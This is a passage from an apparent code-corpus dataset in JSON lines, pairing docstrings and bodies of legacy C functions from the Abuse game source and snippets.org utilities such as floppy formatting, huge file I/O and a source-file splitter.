1727}
{"docstring": "// time in ms\n", "func_signal": "int song::playing()", "code": "{\n  if ((s_init&MUSIC_INITIALIZED) && data)\n  {\n    if (sosMIDISongDone((W32)song_id)==_FALSE)\n      return 1;\n    else return 0;\n  } else return 0;\n}", "path": "imlib\\port\\dos4gw\\sound.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "/*\nlisp_symbol *find_symbol(char *name)\n{\n  cons_cell *cs;\n  for (cs=(cons_cell *)symbol_list;cs;cs=(cons_cell *)CDR(cs))\n  {\n    if (streq( ((char *)((lisp_symbol *)cs->car)->name)+sizeof(lisp_string),name))\n      return (lisp_symbol *)(cs->car);   \n  }\n  return NULL;\n}\n\n\nlisp_symbol *make_find_symbol(char *name)    // find a symbol, if it doesn't exsist it is created\n{\n  lisp_symbol *s=find_symbol(name);\n  if (s) return s;\n  else \n  {\n    int sp=current_space;\n    if (current_space!=GC_SPACE)\n      current_space=PERM_SPACE;       // make sure all symbols get defined in permanant space\n    cons_cell *cs;\n    cs=new_cons_cell();\n    s=new_lisp_symbol(name);\n    cs->car=s;\n    cs->cdr=symbol_list;\n    symbol_list=cs;\n    current_space=sp;\n  }\n  return s;\n}\n\n*/\n", "func_signal": "lisp_symbol *find_symbol(char *name)", "code": "{\n  lisp_symbol *p=lsym_root;\n  while (p)\n  {\n    int cmp=strcmp(name,((char *)p->name)+sizeof(lisp_string));\n    if (cmp==0) return p;\n    else if (cmp<0) p=p->left;\n    else p=p->right;\n  }\n  return NULL;\n}", "path": "macabuse\\src\\lisp.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "// this function takes an image min 8 bit format, converts it to 24 bit\n// color and dithers it so that it can be printed on an deskjet\n/// (i.e it reduces it down to 8 colors)\n", "func_signal": "image *color_dither(image *im, palette *pal, int rev)", "code": "{\n  image *i24;\n  unsigned char min[3],max[3],mid[3],*ad,*sl,*sl2,crimp;\n  int i,j,x,y,delta;\n  (void *)ad=pal->addr();\n\n  // find the minimum and maximum  red green and blue in the image\n  memset(min,0xff,3); memset(max,0,3);\n  for (j=0;j<3;j++,ad++)\n    for (y=0;y<im->height();y++)\n    { sl2=im->scan_line(y);\n      for (x=0;x<im->width();x++)\n      {\n\tif (ad[sl2[x]*3]<min[j]) min[j]=ad[i*3];\n\tif (ad[sl2[x]*3]>max[j]) max[j]=ad[i*3];\n      }\n    }\n  // find the middle color used for red green and blue\n  for (i=0;i<3;i++)\n    mid[i]=(int)((int)max[i]+(int)min[i])/2;\n  // convert the image to 24 bit color.\n  printf(\"Converting to 24 bit color...\\n\");\n  i24=image24(im,pal,rev);\n  printf(\"Dithering using flyod stienberg algorithm\\n\");\n  for (y=0;y<im->height();y++)\n  { if (y%20==0)\n      printf(\"Line %d of %d\\n\",y+1,im->height());\n    sl=i24->scan_line(y);\n    i24->set_page_unswapable();\n\n    if (y+1<im->height())\n      sl2=i24->scan_line(y+1);  // get the scan line below this one\n    for (x=0;x<im->width();x++)\n    {\n      // diffuse the colors using flyod stienburg dithering algorithm\n      for (j=0;j<3;j++)\n      {\n\tcrimp = sl[x*3+j]>mid[j] ? 255 : 0;\n\tdelta=sl[x*3+j]-crimp;\n\tsl[x*3+j]=crimp;\n\tif (x+1<im->width())\n\t{ sl[(x+1)*3+j]=addb(sl[(x+1)*3+j],delta*7/16);\n\t  if (y+1<im->height())\n\t    sl2[(x+1)*3+j]=addb(sl2[(x+1)*3+j],delta*1/16);\n\t}\n\tif (y+1<im->height())\n\t{ if (x>0)\n\t    sl2[(x-1)*3+j]=addb(sl2[(x-1)*3+j],delta*3/16);\n\t  sl2[(x)*3+j]=addb(sl2[(x)*3+j],delta*5/16);\n\t}\n      }\n    }\n    sl=i24->scan_line(y);\n    i24->set_page_swapable();\n\n  }\n  return i24;\n}", "path": "macabuse\\imlib\\readxwd.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "// true if a window lies in this area\n", "func_signal": "int window_manager::window_in_area(int x1, int y1, int x2, int y2)", "code": "{\n  for (jwindow *f=first;f;f=f->next) \n    if (f->x<=x2 && f->y<=y2 && f->x+f->l-1>=x1 && f->y+f->h-1>=y1)\n      return 1;\n  return 0;\n}", "path": "macabuse\\imlib\\jwindow.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "//////////////////////////////////////////////////////////////////////\n//\n//  ADSP Listener Socket Methods\n//\n", "func_signal": "adsp_listener::adsp_listener(int fd) : atalk_base(fd)", "code": "{\n\t// initialize listener with socket\n\tdsp.ioCRefNum = adspRef;\n\tdsp.csCode = dspCLInit;\n\tdsp.u.initParams.ccbPtr = (TPCCB)&ccb;\n\tdsp.u.initParams.localSocket = 0;  // get new \"port\"\n//\tgDspCCB.myA5 = SetCurrentA5();\t\t\t\t\t\t\t\t\t\t\t// save A5 for the user routine\n\n\tif (PBControl((ParmBlkPtr) &dsp, FALSE))\n\t\tdprintf(\"ATALK Listener Initialization Error\\n\");\n\n\tconn = dsp.ccbRefNum;\t// save CCB ref num for later\n}", "path": "macabuse\\src\\net\\mac\\atalk.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "//////////////////////////////////////////////////////////////////////\n//\n//  ADSP Socket Methods\n//\n", "func_signal": "adsp_socket::adsp_socket(int fd) : atalk_base(fd)", "code": "{\n\tdsp.ioCRefNum = adspRef;\n\tdsp.csCode = dspInit;\n\tdsp.u.initParams.ccbPtr = (TPCCB)&ccb;\n\n\t// don't handle exceptions for now\n\tdsp.u.initParams.userRoutine = 0;\n\t// myDSPPBPtr->u.initParams.userRoutine = &myConnectionEvtUserRoutine;\n\n\tdsp.u.initParams.sendQSize = QSIZE;\t\t\t\t\t// size of send queue\n\tdsp.u.initParams.sendQueue = &send_queue;\t\t// send-queue buffer\n\tdsp.u.initParams.recvQSize = QSIZE;\t\t\t\t\t// size of receive queue\n\tdsp.u.initParams.recvQueue = &recv_queue;\t\t// receive-queue buffer\n\tdsp.u.initParams.attnPtr = &attn_buff;\t\t\t// receive-attention buffer\n\tdsp.u.initParams.localSocket = 0;\t\t\t\t\t\t// let ADSP assign socket\n//\tgDspCCB.myA5 = SetCurrentA5();\t\t\t\t\t\t\t\t\t\t\t// save A5 for the user routine\n\n\t// establish a connection end\n\n\tif (PBControl((ParmBlkPtr) &dsp, FALSE))\n\t\tdprintf(\"ATALK ADSP Initialization Error\\n\");\n\n\tconn = dsp.ccbRefNum;\t// save CCB ref num for later\n}", "path": "macabuse\\src\\net\\mac\\atalk.c", "repo_name": "videogamepreservation/abuse", "stars": 67, "license": "None", "language": "c", "size": 1727}
{"docstring": "/*\n** get real dos version\n*/\n", "func_signal": "void    CheckDosVersion(void)", "code": "{\n      if(_osmajor < 4)\n            Error_Message(\"Must be DOS 4.0 or higher.\\n\");\n}", "path": "format.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/*\n** format each track, both sides\n*/\n", "func_signal": "void    FormatDisk(unsigned int drive_number,\n                   unsigned int ftype,\n                   FORMAT_TABLE *ftable)", "code": "{\n      unsigned int    retries, er;\n\n      printf(\"Insert disk in drive %c: and press enter \",\n             drive_number + 'A' - 1);\n\n      while (GetKey() != 0x0d)\n            ;\n\n      printf(\"\\nFormatting %s Data Disk, Please Wait.\\n\",\n             ftable[ftype].Formats_);\n      fpb->Function = 0;      /* format/Verify track */\n      for (fpb->Track = 0; fpb->Track < dpb->Tracks; fpb->Track += 1)\n      {\n            for (fpb->Head = 0;\n                 fpb->Head < ftable[ftype].Heads;\n                 fpb->Head += 1)\n            {\n                  SetAccess(drive_number, apb);\n                  DOS_IOCTL(drive_number, GENERIC_SETDEV, dpb);\n                  printf(\"Formating Track %2u Side %u\\r\",\n                         fpb->Track, fpb->Head);\n                  retries = 0;\n                  while (retries++ < 4 && DOS_IOCTL(drive_number,\n                        GENERIC_FORMAT, fpb))\n                  {\n                        er = FlopyStatus(drive_number);\n                        if((er & 0x80) == 0)\n                        {\n                              er = Extended_Error_Code();\n                              if(er == 0x0d)\n                                    Error_Message(\"Invlaid Media\\n\");\n\n                              if(er == 0x0b)\n                              {\n                                    printf(\"Disk write proteced.\\n\"\n                                           \"Press enter after correcting \"\n                                           \"or escape to abort\\n\");\n                                    do\n                                    {\n                                          er = GetKey();\n                                          if(er == 0x1b)\n                                                Error_Message(\"Format aborted\"\n                                                      \". Disk now invalid.\\n\");\n                                    } while (er != 0x0d);\n                              }\n                        }\n                        ResetDisk(drive_number);\n                        SetAccess(drive_number, apb);\n                        DOS_IOCTL(drive_number, GENERIC_SETDEV, dpb);\n                  }\n            }\n      }\n}", "path": "format.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/* Driver */\n", "func_signal": "int DATINIT(void)", "code": "{\n\tlong Gen,kl,NRecs,Xknu=43019L,Yknu=71633L;\n\tchar X7F[]={'\\x7F','\\0'};\n\tsize_t NodeSize,KeyLen;\n\tFILE *MesgF,*SpecF,*DataF;\n\tDATAHR DataHr;\n\tRECORD Record;\n\tif((MesgF=fopen(MESGFIL,\"w\"))==NULL)goto BADOPENFIL;\n\tprintf(\"\\nSTARTING MAINTEST.C\\n\");\n\tif((SpecF=fopen(SPECFIL,\"r+\"))==NULL) {\t\t/* No Spec File Yet */\n\t\tif((SpecF=fopen(SPECFIL,\"w\"))==NULL)goto BADOPENFIL;\n\t\tprintf(\"Enter # Records in WEIRD.DAT [Min=2]\\n\");\n\t\tscanf(\"%li\",&Gen);\n\t\tNRecs=(Gen<2)?2:Gen;\n\t\tprintf(\"Enter Node Size [Min=3]\\n\");\n\t\tscanf(\"%li\",&Gen);\n\t\tNodeSize=(Gen<3)?3:(size_t)Gen;\n\t\tprintf(\"Enter Key Length [Min=1]\\n\");\n\t\tscanf(\"%li\",&Gen);\n\t\tKeyLen=(Gen<1)?1:(size_t)Gen;\n\t} /* Initial Run Specification */\n\telse {\n\t\tprintf(\"CAN USE PREVIOUS VALUES [Enter 0]\\n\");\n\t\tfscanf(SpecF,\"%li\",&Xknu);\n\t\tfscanf(SpecF,\"%li\",&Yknu);\n\t\tfscanf(SpecF,\"%li\",&NRecs);\n\t\tfscanf(SpecF,\"%li\",&Gen);\n\t\tNodeSize=(size_t)Gen;\n\t\tfscanf(SpecF,\"%li\",&Gen);\n\t\tKeyLen=(size_t)Gen;\n\t\tprintf(\"Enter Random Seed #1 [0< %li <2147483647]\\n\",Xknu);\n\t\tscanf(\"%li\",&Gen);\n\t\tXknu=(Gen<1)?Xknu:Gen;\n\t\tprintf(\"Enter Random Seed #2 [0< %li <2147483399]\\n\",Yknu);\n\t\tscanf(\"%li\",&Gen);\n\t\tYknu=(Gen<1)?Yknu:Gen;\n\t\tprintf(\"Enter # Records in WEIRD.DAT [1< %li <Many]\\n\",NRecs);\n\t\tscanf(\"%li\",&Gen);\n\t\tNRecs=(Gen<2)?NRecs:Gen;\n\t\tprintf(\"Enter Node Size [2< %u <~127]\\n\",(unsigned)NodeSize);\n\t\tscanf(\"%li\",&Gen);\n\t\tNodeSize=(Gen<3)?NodeSize:(size_t)Gen;\n\t\tprintf(\"Enter Key Length [0< %u <Many]\\n\",(unsigned)KeyLen);\n\t\tscanf(\"%li\",&Gen);\n\t\tKeyLen=(Gen<1)?KeyLen:(size_t)Gen;\n\t} /* Vary Specification From Previous Run */\n\tprintf(\"USER INPUT ENDS HERE\\n\");\n\trewind(SpecF);\n\tfprintf(SpecF,\" %li \\n\",Xknu);\n\tfprintf(SpecF,\" %li \\n\",Yknu);\n\tfprintf(SpecF,\" %li \\n\",NRecs);\n\tfprintf(SpecF,\" %li \\n\",(long)NodeSize);\n\tfprintf(SpecF,\" %li \\n\",(long)KeyLen);\n\tif(fclose(SpecF)!=0)goto BADCLOSEFIL;\n\tRecord.Flags=16384|4|1;\t\t\t/* Sys + Read + Hide */\n\tRecord.RecNum=0;\t\t\t/* Sentinel Record #0 */\n\tstrncpy(Record.StrDatK,X7F,ZLEN);\t/* String Sentinel */\n\tRecord.NumDatK=LONG_MAX;\t\t/* long int Sentinel */\n\tif((DataF=fopen(DATAFIL,\"wb\"))==NULL)goto BADOPENFIL;\n\tfwrite(&DataHr,sizeof(DATAHR),1,DataF);\n\tfwrite(&Record,sizeof(RECORD),1,DataF);\n\tfor(kl=1;kl<NRecs;kl++) {\n\t\tRecord.Flags=0;\n\t\tRecord.RecNum=kl;\n\t\tMAKSTR(Record.StrDatK,ZLEN,&Xknu,&Yknu);\n\t\tRecord.NumDatK=KNURAN(&Xknu,&Yknu);\n\t\tfwrite(&Record,sizeof(RECORD),1,DataF);\n\t} /* Non-Sentinel Records */\n\tif(fclose(DataF)!=0)goto BADCLOSEFIL;\n\tif((DataF=fopen(DATAFIL,\"rb\"))==NULL)goto BADOPENFIL;\n\tfread(&DataHr,sizeof(DATAHR),1,DataF);\n\tfor(kl=0;kl<8;kl++) {\n\t\tfread(&Record,sizeof(RECORD),1,DataF);\n\t\tfprintf(MesgF,\"%-4X  \",Record.Flags);\n\t\tfprintf(MesgF,\"%10ld  \",Record.RecNum);\n\t\tfprintf(MesgF,\"%-25s  \",Record.StrDatK);\n\t\tfprintf(MesgF,\"%+11ld\\n\",Record.NumDatK);\n\t} /* List 8 Records */\n\tif(fclose(DataF)!=0)goto BADCLOSEFIL;\n\tif(fclose(MesgF)!=0)goto BADCLOSEFIL;\n\treturn 1;\nBADOPENFIL:printf(\"Can't Open File in DATINIT\\n\");goto STOP;\nBADCLOSEFIL:printf(\"Can't Close File in DATINIT\\n\");goto STOP;\nSTOP:exit(EXIT_FAILURE);return 0;\n}", "path": "maintest.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/*\n**  Read any size block to anywhere in memory\n*/\n", "func_signal": "long hugefread(FILE *fp, char FAR *buf, long size)", "code": "{\n      long count;\n      size_t bufsiz;\n      char *tmp;\n      long ercode = size;\n\n      if (4 > sizeof(void *))\n      {\n            if (0 == (bufsiz = gettmp(&tmp)))\n                  return -1L;\n      }\n      else\n      {\n            tmp = (char *)buf;\n            bufsiz = 0x4000;\n      }\n\n      buf = farnormal(buf);\n      while (0 < (count = min(size, (long)bufsiz)))\n      {\n            int i, numread = fread(tmp, 1, (size_t)count, fp);\n\n            if (1 > numread || numread != (int)count)\n                  return -1L;\n            if (4 > sizeof(void *))\n            {\n                  for (i = 0; i < count; ++i)\n                        buf[i] = tmp[i];\n            }\n            buf = farnormal(buf + count);\n            size -= count;\n            if (2 < sizeof(void *))\n                  tmp = (char *)buf;\n      }\n      return ercode;\n}", "path": "hugeread.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/* Contact: mitchell.frank@bigwig.net */\n", "func_signal": "int main(void)", "code": "{\n\tDATINIT();\n\tBTRINIT();\n\tTREESCAN();\n\treturn 1;\n}", "path": "maintest.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/*\n * add_list - Add a file name to linked list of files to be processed.\n */\n", "func_signal": "SLST *add_list (char *fname)", "code": "{\n  SLST *new = NULL;\n\n  if (NULL == (new = (SLST *)malloc (sizeof(SLST))))\n  {\n    puts (\"Error allocating memory.\\n\");\n  }\n  else\n  {\n    strcpy (new->srcfile, fname);\n    new->next = NULL;\n\n    if (NULL == cur)\n      head = new;\n    else\n      cur->next = new;\n  }\n  cur = new;\n  return cur;\n}", "path": "csplit.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/*\n * disp_help - Display help screen to user.\n */\n", "func_signal": "void disp_help (void)", "code": "{\n  puts (\"This utility processes C/C++ source files for the purpose of transmission\");\n  puts (\"through a FidoNet (tm) echo so as to circumvent oversize message problems.\\n\");\n  puts (\"Split:    CSplit  [ [/tn] [/wn] [/ln] [/sc] ]  outfile  srcfile [ ... ]\");\n  puts (\"Extract:  CSplit  /x  infile  [ ... ]\\n\");\n  puts (\"Where:      /t n - For TAB character expansion, the number of columns\");\nprintf (\"                   for each TAB stop.  (min/default/max: %d/%d/%d)\\n\", TABMIN, TABDEF, TABMAX);\n  puts (\"            /w n - For width control, the column number to be used for\");\nprintf (\"                   breaking long lines.  (min/default/max: %d/%d/%d)\\n\", WIDMIN, WIDDEF, WIDMAX);\n  puts (\"            /l n - For length control, the number of lines to limit\");\nprintf (\"                   each section.  (0 disable, min/default/max: %d/%d/%d)\\n\", LENMIN, LENDEF, LENMAX);\n  puts (\"            /s c - Use 'c' as the line separator character instead\");\nprintf (\"                   of the default separator character, '%c'.\\n\", SEP_CDEF);\n  puts (\"         outfile - Output file name.  The extension will be the\");\n  puts (\"                   sequential section number.\");\n#if defined(__STDC__)\n  puts (\"         srcfile - Source file(s)  (no wildcard support)\");\n#else\n  puts (\"         srcfile - Source file(s)  (wildcards supported)\");\n#endif\n  puts (\"          infile - Input file name.  An extension indicates file contains the\");\n  puts (\"                   sections in proper consecutive order ready for extraction.\");\n  puts (\"                   Otherwise, infile.001, infile.002, etc., will be used.\");\n}", "path": "csplit.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/* Initialize Data File */\n", "func_signal": "int MAKSTR(char*Buffer,int Len,long*XknuP,long*YknuP)", "code": "{\n\tint k,Lenb,m;\n\tlong RanL;\n\tfloat a;\n\tstatic const float POW31=2147483648.0; \t/* Max Knuth Integer +1 */\n\t\tRanL=KNURAN(XknuP,YknuP);\n\t\ta=RanL/POW31;\n\t\tLenb=(int)(Len-a*0.5*Len);\t/* Max = Len-1 */\n\t\tLenb=(Lenb<2)?2:Lenb;\n\tfor(k=0;k<Lenb;k++) {\n\t\tRanL=KNURAN(XknuP,YknuP);\n\t\ta=RanL/POW31;\n\t\tm=(int)(48.0+a*62.0);\n\t\tif(m>57)m+=7;\n\t\tif(m>90)m+=6;\n\t\tBuffer[k]=(char)m;\n\t} /* Random Distrib Alpha-Numeric <\\x7F */\n\tBuffer[Lenb]='\\0';\n\treturn Lenb;\n}", "path": "maintest.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/*\n**  Read any size block to anywhere in memory\n*/\n", "func_signal": "long hugeread(int fh, unsigned char FAR *buf, long size)", "code": "{\n      long count;\n      size_t bufsiz;\n      char *tmp;\n      long ercode = size;\n\n      if (4 > sizeof(void *))\n      {\n            if (0 == (bufsiz = gettmp(&tmp)))\n                  return -1L;\n      }\n      else\n      {\n            tmp = (char *)buf;\n            bufsiz = 0x4000;\n      }\n\n      buf = farnormal(buf);\n      while (0 < (count = min(size, (long)bufsiz)))\n      {\n            int i, numread = read(fh, tmp, (size_t)count);\n\n            if (1 > numread || numread != (int)count)\n                  return -1L;\n            if (4 > sizeof(void *))\n            {\n                  for (i = 0; i < count; ++i)\n                        buf[i] = tmp[i];\n            }\n            buf = farnormal(buf + count);\n            size -= count;\n            if (2 < sizeof(void *))\n                  tmp = (char *)buf;\n      }\n      return ercode;\n}", "path": "hugeread.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/*\n**  Write any size block from anywhere in memory\n*/\n", "func_signal": "long hugefwrite(FILE *fp, char FAR *buf, long size)", "code": "{\n      long count;\n      size_t bufsiz;\n      char *tmp;\n      long ercode = size;\n\n      if (4 > sizeof(void *))\n      {\n            if (0 == (bufsiz = gettmp(&tmp)))\n                  return -1L;\n      }\n      else\n      {\n            tmp = (char *)buf;\n            bufsiz = 0x4000;\n      }\n\n      buf = farnormal(buf);\n      while (0 < (count = min(size, (long)bufsiz)))\n      {\n            int i, numwrite;\n\n            if (4 > sizeof(void *))\n            {\n                  for (i = 0; i < count; ++i)\n                        tmp[i] = buf[i];\n            }\n            numwrite = fwrite(tmp, 1, (size_t)count, fp);\n            if (1 > numwrite || numwrite != (int)count)\n                  return -1L;\n            buf = farnormal(buf + count);\n            size -= count;\n            if (2 < sizeof(void *))\n                  tmp = (char *)buf;\n      }\n      return ercode;\n}", "path": "hugeread.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/*\n * csp_fgets - A custom fgets() function that expands\n *             tabs, deletes trailing whitespace and\n *             performs line wrapping.\n */\n", "func_signal": "char *csp_fgets (char *s, int len, FILE * fp, int tabstop)", "code": "{\n  static char  sbuf[LLENMAX * 2]; /* big enough for TAB expansion */\n  static char *beg  = sbuf;\n  static int   tofs = 0;\n  static int   wrap = B_FALSE;\n\n  char *e = 0;\n  char *w = 0;\n  char *p = s;\n  char *q = 0;\n\n  int   ch     = 0;\n  int   cnt    = 0;\n  int   i      = 0;\n  int   spaces = 0;\n\n  if (B_TRUE == wrap)             /* if line wrap */\n  {\n    tofs += (int)(beg - sbuf);    /* adj. TAB column offset */\n    strcpy (s, \"\\\\\\n\");\n    memmove (sbuf, beg, strlen (beg) + 1); /* DG: Modification for  */\n    beg  = sbuf;                           /* DG: long lines w/o WS */\n    wrap = B_FALSE;\n    return s;\n  }\n\n  while ((cnt < len-1) && ('\\n' != ch))\n  {                                    /* get next char from buffer */\n    if (0 == (ch = *beg++))            /* if buffer empty */\n    {\n      memset (sbuf, 0, sizeof (sbuf));\n      beg = fgets (sbuf, LLENMAX, fp); /* grab another string */\n\n      if (NULL == beg)                 /* if end of file... */\n      {\n        beg = sbuf;\n        *beg = 0;\n\n        if (0 == cnt)\n          return NULL;                 /*  and buffer empty */\n      }\n      else\n      {\n        w = e = &sbuf[i = strlen (sbuf)]; /* find 1st trailing ws char */\n\n        while ((w > sbuf) && (isspace (*(w - 1))))\n          --w;\n\n        if (('\\n' == *(e - 1)) || /* if terminated w/newline char */\n            (i < (len-1)))        /* or unterminated short line */\n        {\n          *w++ = '\\n';            /* terminate with newline char */\n        }\n\n        *w = 0;\n        ch = *beg++;\n      }\n    }\n\n    if (ch == '\\t')               /* if TAB character */\n    {                             /* space to next tab stop */\n      /*\n       * TS: The following code has been changed to pad to the next\n       * tab stop, rather than insert a fixed number of spaces.\n       */\n      spaces = tabstop - (((int)(tofs + beg - sbuf) - 1) % tabstop);\n      memmove (beg + spaces - 1, beg, strlen (beg) + 1);\n\n      for (q = beg - 1; spaces > 0; --spaces)\n        *q++ = ' ';\n\n      ch = ' ';                   /* change TAB to space */\n    }\n\n    *p++ = (char)ch;              /* update output string */\n    ++cnt;\n\n    if ((cnt == len - 1) && ('\\n' != ch))   /* if need to wrap line */\n    {\n      beg -= 2;                   /* make room for \"\\\\\\n\" characters */\n      e = beg;\n      p -= 2;\n      q = p;\n\n      /* unget characters to 1st previous space */\n      while ((e > sbuf) && (' ' != *(e - 1)))\n      {\n        --q;\n        --e;\n      }\n\n      /*if (((beg - e) < len) && (e != sbuf))*/\n      if (e != sbuf)              /* if wrap on space char */\n      {                           /* ( else wrap asis ) */\n        p = q;\n        beg = e;\n      }\n\n      *p++ = '\\\\';                /* terminate current line */\n      *p++ = '\\n';\n      wrap = B_TRUE;              /* flag wrap line pending */\n    }\n  } /*end_while*/\n\n  if ('\\n' == ch)\n    tofs = 0;\n\n  *p = 0;\n  return s;\n}", "path": "csplit.c", "repo_name": "vonj/snippets.org", "stars": 101, "license": "other", "language": "c", "size": 1047}
{"docstring": "/*\n * extr_file - This function processes a properly concatenated file\n *             of consequtive sections to extract the original source.\n */\n", "func_signal": "int extr_file (char *infile, char sepchar)", "code": "{\n  static char  line [WIDMAX * 2];\n  static char  line2[WIDMAX * 2];\n\n  char         outfile[MAXFSPEC + 1];\n  char         sep_ln[32];\n  char        *sptr = 0;\n  char         tchar      = 0;\n\n  int          curpart    = 0;\n  int          found      = B_FALSE;\n  int          indx       = 0;\n  int          in_section = B_FALSE;\n  int          len        = 0;\n  int          key        = 0;\n  int          lines      = 0;\n  int          maxpart    = 0;\n  int          pos_wrap   = B_FALSE;\n  int          sepmax     = 0;\n  int          seppart    = 0;\n  int          sep_id_len = 0;\n  int          temp       = 0;\n\n  unsigned short crc = 0;\n  unsigned short sepcrc = 0;\n\n\n  for (temp = 0; temp < SEP_CLEN; ++temp)\n    sep_ln[temp] = (char)sepchar;\n\n  sep_ln[temp++] = ' ';\n  strcpy (&sep_ln[temp], SEP_ID);\n  sep_id_len = strlen (sep_ln);\n\n  if (NULL == (finp = fopen (infile, \"r\")))\n  {\n    char fname[MAXFSPEC + 1];\n\n    if ((NULL == (sptr = strrchr (infile, '\\\\'))) && /* ignore path */\n        (NULL == (sptr = strrchr (infile, ':'))))\n    {\n      sptr = infile;                        /* V2.2#3 correction */\n    }\n\n    if (NULL != strchr (sptr, '.'))         /* if extension exists */\n    {\n      printf (\"Error opening input file for extraction.\\n\");\n      return FILEIO;\n    }\n\n    if ((strlen (infile) + 4) > MAXFSPEC)   /* if file spec too large */\n    {\n      printf (\"Input file name argument too long.\\n\");\n      return SYNTAX;\n    }\n\n    indx = 1;\n    sprintf (fname, \"%s.%03d\", infile, indx);\n\n    if (NULL != (finp = fopen (fname, \"r\")))\n    {\n      sprintf (tempfile, \"%s.CSP\", infile);\n\n      if (NULL == (ftmp = fopen (tempfile, \"w\")))\n      {\n        printf (\"Unable to open \\\"%s\\\" temp file.\\n\", tempfile);\n        return FILEIO;\n      }\n\n      printf (\"Processing input files: %s ...\\n\", fname);\n\n      do\n      {\n        while (NULL != fgets (line, sizeof (line), finp))\n          fputs (line, ftmp);\n\n        fclose (finp);\n        ++indx;\n        sprintf (fname, \"%s.%03d\", infile, indx);\n        finp = fopen (fname, \"r\");\n\n      } while (NULL != finp);\n\n      fclose (ftmp);\n\n      if (NULL == (finp = fopen (tempfile, \"r\")))\n      {\n        printf (\"Error opening temp file \\\"%s\\\" for extraction.\\n\", outfile);\n        return FILEIO;\n      }\n    }\n    else\n    {\n      printf (\"Error opening input file \\\"%s\\\" for extraction.\\n\", infile);\n      return FILEIO;\n    }\n  }\n  else\n  {\n    printf (\"Processing input file: %s\\n\", infile);\n  }\n\n  crc = curpart = maxpart = lines = 0;\n  in_section = pos_wrap = B_FALSE;\n  fout = NULL;\n  initcrctab ();\n  *line2 = 0;\n\n  while (NULL != finp)\n  {\n    /* AR: increased line input size */\n    sptr = fgets (line, sizeof (line), finp);\n\n    if (NULL == sptr)\n    {\n      if (feof (finp))            /* end of file */\n      {\n        fclose (finp);\n        finp = NULL;\n      }\n      else\n      {\n        if (lines)\n          printf (\"(line %d) \", lines);\n\n        printf (\"Unable to read from input file:  %s\\n\", infile);\n        return FILEIO;\n      }\n    }\n    else                          /* process line */\n    {\n      /* TS: eliminate any added trailing spaces */\n      for (indx = strlen (sptr) - 1; indx && (' ' == line[indx - 1]); --indx)\n        continue;\n\n      line[indx]   = '\\n';\n      line[indx+1] = '\\0';\n      ++lines;\n\n      /*\n       * Find 1st separator line to determine if correct separator\n       * character is being used and use the one that was found.\n       */\n      if (!found && (0 != strstr (line, SEP_ID)))\n      {\n        for (temp = 0; isspace (line[temp]); ++temp)\n          ;  /* null statement */\n\n        tchar = line[temp];                 /* skip leading ws */\n\n        if (sepchar != tchar)\n          for (temp = 0; temp < SEP_CLEN; ++temp)\n            sep_ln[temp] = tchar;\n\n        found = B_TRUE;\n      }\n\n      if (0 != (sptr = strstr (line , sep_ln))) /* if separator line */\n      {\n        sptr += sep_id_len;\n\n        if (sptr == strstr (sptr, SEP_BF))  /* if begin file */\n        {\n          if (NULL != fout)\n          {\n            printf (\"(line %d) \", lines);\n            puts (\"Encountered 2nd \\\"Begin file\\\" separator\");\n            puts (\"line before expected \\\"End file\\\" separator line:\");\n            puts (line);\n            return PROCESS;\n          }\n\n          sptr += strlen (SEP_BF);\n\n          if (1 != sscanf (sptr, \"%s\", outfile))\n          {\n            printf (\"(line %d) \", lines);\n            puts (\"Unable to parse filename from separator line:\");\n            puts (line);\n            return PROCESS;\n          }\n\n          if (NULL != (fout = fopen (outfile, \"r\")))\n          {\n            key = 0;\n            printf (\"\\nOutput file already exists:  %s\\n\", outfile);\n\n            do\n            {\n              printf (\"Overwrite? (y/n) \");\n              key = getchar ();\n              puts (\"\");\n              temp = key;\n\n              while (temp != '\\n')\n                temp = getchar();  /* eat any/all extra keystrokes */\n\n              if (('n' == key) || ('N' == key))\n                return ABORT;\n\n            } while (('y' != key) && ('Y' != key));\n\n            if (NULL == freopen (outfile, \"w\", fout))\n            {\n              printf (\"Unable to open file for output:  %s\\n\", outfile);\n              return FILEIO;\n            }\n          }\n          else\n          {\n            if (NULL == (fout = fopen (outfile, \"w\")))\n            {\n              printf (\"Unable to open file for output:  %s\\n\", outfile);\n              return FILEIO;\n            }\n          }\n\n          printf (\"Extracting file %s\\n\", outfile);   /* Phi Nguyen */\n          crc = updcrc (crc, (unsigned char *)line, strlen (line));\n        }\n        else if (sptr == strstr (sptr, SEP_EF))  /* if end file */\n        {\n          if (NULL == fout)\n          {\n            printf (\"(line %d) \", lines);\n            puts (\"Encountered an \\\"End file\\\" separator line\");\n            puts (\"before a \\\"Begin file\\\" separator line:\");\n            puts (line);\n            return PROCESS;\n          }\n\n          if (fclose (fout))\n          {\n            printf (\"Unable to close output file:  %s\\n\", outfile);\n            return FILEIO;\n          }\n\n          fout = NULL;\n          crc = updcrc (crc, (unsigned char *)line, strlen (line));\n        }\n        else if (sptr == strstr (sptr, SEP_BP))  /* if begin part */\n        {\n          if (B_TRUE == in_section)\n          {\n            printf (\"(line %d) \", lines);\n            puts (\"Encountered 2nd \\\"Begin part\\\" separator\");\n            puts (\"line 